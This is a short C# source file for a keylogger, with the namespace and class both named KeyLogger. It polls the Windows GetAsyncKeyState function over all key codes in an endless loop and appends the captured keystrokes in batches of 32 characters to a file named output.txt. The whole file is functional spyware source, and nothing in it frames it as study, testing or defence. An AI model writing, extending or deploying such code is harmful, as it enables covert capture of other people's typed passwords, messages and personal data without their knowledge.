using System.IO;
using System.Runtime.InteropServices;

namespace KeyLogger {
    class KeyLogger {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        public void ReadKeys() {
            string keys = "";
            while (true) {
                for (int i = 0; i < 255; i++) {
                    int keyPressed = GetAsyncKeyState(i);
                    if (keyPressed == 32769) {
                        keys += (char)i;
                    }
                }
                if (keys.Length >= 32) {
                    File.AppendAllText("output.txt", keys);
                    keys = "";
                }
            }
        }
    }
}